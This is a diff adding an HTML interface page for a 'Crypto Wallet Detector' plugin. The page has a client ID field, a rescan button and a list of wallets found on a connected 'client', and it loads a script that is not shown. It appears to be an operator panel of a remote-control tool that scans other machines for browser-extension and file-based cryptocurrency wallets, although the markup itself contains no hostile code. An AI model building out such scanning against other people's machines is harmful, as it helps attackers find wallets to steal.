@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Crypto Wallet Detector</title>
+    <link rel="stylesheet" href="/plugins/crypto-wallet/assets/crypto-wallet.css" />
+  </head>
+  <body>
+    <main class="container">
+      <header class="header">
+        <h1>&#x20BF; Crypto Wallet Detector</h1>
+        <p class="sub">Scans for browser extension wallets and file-based wallets</p>
+      </header>
+
+      <section class="card">
+        <div class="toolbar">
+          <input id="client-id" class="input" placeholder="Client ID" />
+          <button id="rescan-btn" class="btn">Rescan</button>
+        </div>
+      </section>
+
+      <section class="card" id="results-card">
+        <h2 class="section-title">Detected Wallets <span id="wallet-count" class="count-pill">0</span></h2>
+        <div id="wallet-list" class="wallet-list">
+          <p class="empty-msg">No wallets detected yet. Load this plugin on a client to scan.</p>
+        </div>
+      </section>
+
+      <section class="card">
+        <h2 class="section-title">Log</h2>
+        <pre id="log" class="log"></pre>
+      </section>
+    </main>
+
+    <script src="/plugins/crypto-wallet/assets/crypto-wallet.js"></script>
+  </body>
+</html>
